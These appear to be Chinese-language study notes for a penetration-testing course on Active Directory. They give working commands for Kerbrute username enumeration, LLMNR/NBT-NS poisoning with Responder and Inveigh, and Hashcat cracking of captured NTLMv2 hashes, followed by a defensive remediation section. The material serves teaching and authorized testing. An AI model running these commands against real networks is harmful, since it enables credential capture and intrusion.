# 第 72A 章 - Kerbrute 與 LLMNR/NBT-NS 毒化

## 標籤

- #cpts
- #chapter
- #active-directory
- #enumeration
- #kerbrute
- #llmnr
- #responder
- #inveigh

## 學習目標

- 用 Kerbrute 搭配統計常見使用者名稱字典做精準列舉。
- 理解 LLMNR/NBT-NS 毒化攻擊的原理與條件。
- 能用 Responder（Linux）和 Inveigh（Windows）擷取 NTLMv2 hash。
- 用 Hashcat 離線破解 NTLMv2 hash 取得明文密碼。
- 理解在已控制的網域主機上取得 SYSTEM 後可做什麼。

---

## 理論基礎

```text
Kerbrute 使用者名稱列舉原理：
  Kerberos AS-REQ 對不同情況回傳不同錯誤碼
  → 使用者存在（需密碼）：PREAUTH_REQUIRED（錯誤碼 18）
  → 使用者不存在：       PRINCIPAL_UNKNOWN（錯誤碼 6）
  → 隱蔽性高：Kerberos 預驗證失敗預設不觸發帳號鎖定
              且通常不產生 4625（登入失敗）事件日誌

LLMNR / NBT-NS 毒化原理：
  DNS 查詢失敗 → 主機向本地廣播詢問
  → LLMNR（Link-Local Multicast Name Resolution）UDP 5355
  → NBT-NS（NetBIOS Name Service）UDP 137
  → 網段內任何主機都可以假裝「我知道答案」
  → 受害者相信回覆，向攻擊者發送 NTLM 認證
  → 攻擊者取得 NTLMv2 hash → 離線破解 or SMB Relay

條件限制：
  LLMNR / NBT-NS 毒化只在同廣播網段有效
  → 攻擊者必須在 172.16.x.x 廣播域裡
  → 透過 Responder（Kali）或 Inveigh（已控 Windows 主機）執行
```

---

## Kerbrute：搭配統計字典精準列舉

### 推薦字典

```bash
# insidetrust/statistically-likely-usernames（GitHub）
# jsmith.txt  → 常見英文姓名組合（first.last / flast / firstl 等）
# jsmith2.txt → 延伸版，包含數字後綴
git clone https://github.com/insidetrust/statistically-likely-usernames
ls statistically-likely-usernames/
# jsmith.txt / jsmith2.txt / john.txt / top-formats.txt 等
```

```bash
# 用 jsmith.txt 列舉（不知道員工姓名時的第一步）
./kerbrute userenum \
  -d DOMAIN.LOCAL \          # 目標網域（Kerberos realm）
  --dc DC_IP \               # DC 的 IP，送 AS-REQ 到這裡
  statistically-likely-usernames/jsmith.txt \
  -o valid_users.txt         # 把有效帳號存起來
# 輸出格式：
#   [+] VALID USERNAME: john.doe@DOMAIN.LOCAL
#   [+] VALID USERNAME: jsmith@DOMAIN.LOCAL   [NOT PREAUTH]  ← ASREPRoastable！
#
# [NOT PREAUTH] 標記 = 這個帳號不需要預認證 → 立刻跑 ASREPRoast

# 已知員工姓名時：先生成姓名變體字典
username-anarchy --input-file full_names.txt \
  --select-format first.last,flast,firstl,first_last \
  > generated_usernames.txt
# --input-file   → 姓名清單（一行 "First Last"）
# --select-format → 要生成的格式組合
#   first.last = john.doe   flast = jdoe
#   firstl = johnd           first_last = john_doe

./kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP generated_usernames.txt -o valid_users.txt
```

---

## 理論：在網域主機取得 SYSTEM 後可以做什麼

```text
NT AUTHORITY\SYSTEM 是 Windows 最高權限帳號。
在已加域主機（Domain-joined）上的 SYSTEM 可以：
  → 模擬電腦帳號（Machine Account）
  → 電腦帳號本質上是 AD 使用者帳號（帶 $ 後綴）
  → 因此 SYSTEM = 低權域帳號，可做所有域帳號能做的事

從 SYSTEM 可延伸的攻擊：
  ├── BloodHound / PowerView 列舉（用電腦帳號憑證）
  ├── Kerberoasting / ASREPRoasting（向 DC 請求 TGS）
  ├── 執行 Inveigh → 毒化廣播 → 擷取 NTLMv2 hash
  ├── 權杖模擬（Token Impersonation）→ 劫持已登入的高權帳號
  └── ACL 攻擊（取決於電腦帳號的 ACL 關係）

取得 SYSTEM 的常見路徑：
  ├── EternalBlue（MS17-010）/ BlueKeep 等遠端利用
  ├── SeImpersonatePrivilege → JuicyPotato / PrintSpoofer
  ├── 本機提權漏洞（Task Scheduler 0-day 等）
  └── 本機 Admin → psexec 開 SYSTEM cmd
```

---

## LLMNR/NBT-NS 毒化：Responder（Linux）

### 理論

```text
攻擊流程範例：
  1. 受害者試圖連 \\print01.corp.local
  2. 打錯成 \\printer01.corp.local
  3. DNS 查詢失敗 → 廣播 LLMNR/NBT-NS 詢問
  4. Responder 回覆「我知道 printer01 的位置」
  5. 受害者相信，送出 NTLM 認證（NTLMv2 hash）
  6. 攻擊者擷取 hash → 離線破解 or Relay 到其他服務

可擷取的協定（Responder 支援）：
  SMB / LDAP / MSSQL / HTTP / HTTPS / FTP / POP3 / IMAP / SMTP
  LLMNR / NBT-NS / MDNS / DHCP / ICMP / WebDAV / Proxy Auth

需要開放的 Port（攻擊主機）：
  UDP: 137, 138, 53, 389, 1434, 5355, 5353
  TCP: 80, 135, 139, 445, 1433, 21, 25, 110, 587, 3128, 3141
```

```bash
# 分析模式（不毒化，只觀察廣播流量）
sudo responder -I eth0 -A
# -I eth0 → 監聽的網路介面
# -A      → Analyze mode：只看，不回覆，隱蔽評估環境

# 毒化模式（正式攻擊）
sudo responder -I eth0
# 啟動後讓它在背景跑（用 tmux 視窗）
# 同時進行其他列舉工作，最大化擷取機率

# 常用額外選項
sudo responder -I eth0 -wf
# -w → 啟動 WPAD 惡意代理伺服器
#      → 瀏覽器開啟自動偵測設定時，擷取所有 HTTP 請求
# -f → 指紋識別遠端主機 OS 版本

# 查看擷取的 hash（儲存在以下位置）
ls /usr/share/responder/logs/
# 格式：SMB-NTLMv2-SSP-172.16.5.25.txt
#       HTTP-NTLMv2-172.16.5.200.txt
# 也存在 SQLite DB：/usr/share/responder/Responder.db

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt
# 內容：USERNAME::DOMAIN:Challenge:NTHash:BlobHash
```

---

## LLMNR/NBT-NS 毒化：Inveigh（Windows 主機）

適用場景：已用 WinRM 或 RDP 控制了一台 Windows 主機，且該主機在廣播域內。

```powershell
# 上傳 Inveigh.ps1 到目標主機後執行
Import-Module .\Inveigh.ps1
# Import-Module → 載入 PowerShell 模組

# 啟動毒化（背景執行）
Invoke-Inveigh `
  -LLMNR Y `          # 啟用 LLMNR 毒化
  -NBNS Y `           # 啟用 NBT-NS 毒化
  -ConsoleOutput N `  # 不在 console 即時輸出（背景安靜跑）
  -FileOutput Y `     # 把擷取結果寫到檔案
  -FileOutputDirectory C:\Windows\Temp `  # 輸出目錄
  -RunTime 120        # 跑 120 分鐘後自動停止

# 每隔一段時間檢查結果
Get-Inveigh -NTLMv2         # 顯示擷取到的 NTLMv2 hash
Get-Inveigh -Log | Select-Object -Last 20  # 看最後 20 條日誌

# 停止 Inveigh
Stop-Inveigh

# 查看輸出檔案（hash 會在這裡）
type C:\Windows\Temp\Inveigh-NTLMv2.txt
```

---

## NTLMv2 Hash 破解

```bash
# NTLMv2 是擷取到的 hash 類型，不能直接 Pass-the-Hash
# 必須離線破解取得明文密碼

# Hashcat 破解（mode 5600 = NTLMv2）
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
# -m 5600 → NetNTLMv2 hash 模式
# captured.hash → 包含完整 NTLMv2 格式的檔案
# rockyou.txt   → 字典

# hash 格式（Responder 輸出的格式，直接餵給 hashcat）
# USER::DOMAIN:Challenge:NTHash:Blob
# 例：FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...

# 破解成功後查看結果
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --show
# --show → 顯示已破解的條目（格式：hash:明文密碼）

# 若 rockyou 不夠用，加 rule
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# -r → 套用變形規則（大小寫、加數字後綴等）

# 識別不認識的 hash 類型
# 參考：https://hashcat.net/wiki/doku.php?id=example_hashes
```

---

## 判斷邏輯

```
無憑證初期列舉
    ├── 不知道員工姓名
    │   └── Kerbrute + jsmith.txt / jsmith2.txt → 建立有效使用者清單
    ├── 知道員工姓名
    │   └── username-anarchy 生成變體 → Kerbrute 列舉
    │
    ├── 有網段存取（同廣播域）
    │   ├── Kali 攻擊 → Responder -I eth0（tmux 背景跑）
    │   └── 已控 Windows → Inveigh -LLMNR Y -NBNS Y
    │
    ├── 擷取到 hash
    │   └── hashcat -m 5600 → 破解 → 取得明文密碼
    │       └── 密碼拿去 password spray / 直接使用
    │
    └── hash 破不開 → 考慮 SMB Relay（見 Ch 76 NTLM 攻擊）
```

---

## 速查表

```bash
# Kerbrute 使用者列舉（統計字典）
./kerbrute userenum -d DOMAIN.LOCAL --dc DC_IP \
  statistically-likely-usernames/jsmith.txt -o valid_users.txt

# 生成姓名變體字典
username-anarchy --input-file names.txt \
  --select-format first.last,flast,firstl > usernames.txt

# Responder 分析模式（先觀察）
sudo responder -I eth0 -A

# Responder 毒化模式
sudo responder -I eth0

# Inveigh（Windows）
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -FileOutput Y -FileOutputDirectory C:\Windows\Temp -RunTime 60
Get-Inveigh -NTLMv2

# 破解 NTLMv2
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

---

## 修復建議（防禦視角）

> MITRE ATT&CK：**T1557.001** — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

```text
核心原則：
  停用 LLMNR 與 NBT-NS → 廣播查詢不再發出 → 毒化攻擊失效
  注意：這是重大變更，務必在環境中逐步測試後再全面部署
  滲透測試人員的職責：建議步驟，並清楚告知客戶需自行驗證影響
```

### 停用 LLMNR（透過 Group Policy）

```
路徑：
  電腦設定
  → 系統管理範本
  → 網路
  → DNS 用戶端
  → 啟用「關閉多點傳送名稱解析」（Turn Off Multicast Name Resolution）

說明：
  設定為「已啟用」= 停用 LLMNR
  → 主機不再廣播 UDP 5355 查詢
  → 可透過 GPO 集中部署，無需逐台設定
```

### 停用 NBT-NS（逐台本地設定）

```
路徑：
  控制台
  → 網路和共用中心
  → 變更介面卡設定
  → 右鍵介面卡 → 內容
  → 網際網路通訊協定第 4 版（TCP/IPv4）→ 內容
  → 進階 → WINS 索引標籤
  → 選擇「停用 NetBIOS over TCP/IP」

限制：
  NBT-NS 無法透過 GPO 統一停用
  → 需在每台主機個別設定
  → 可考慮透過 PowerShell 腳本批次部署
```

### 其他縱深防禦

```text
1. 啟用 SMB Signing（強制）
   → 即使擷取到 hash 也無法做 Relay 攻擊
   → 在 GPO 設定：Microsoft 網路伺服器：數位簽署通訊（一律）

2. 網路分隔
   → 攻擊者需在同廣播域才能毒化
   → VLAN 分隔限縮廣播域範圍

3. 監控異常的 LLMNR/NBT-NS 流量
   → 大量廣播回應來自同一 IP → 可能是毒化攻擊
   → 監控事件日誌 4625（NTLM 認證失敗）異常激增
```

---

## 關聯筆記

- [[72-無憑證AD列舉|第 72 章 - 無憑證 AD 列舉]]
- [[73-有憑證AD列舉|第 73 章 - 有憑證 AD 列舉]]
- [[76-NTLM攻擊|第 76 章 - NTLM 攻擊（SMB Relay）]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
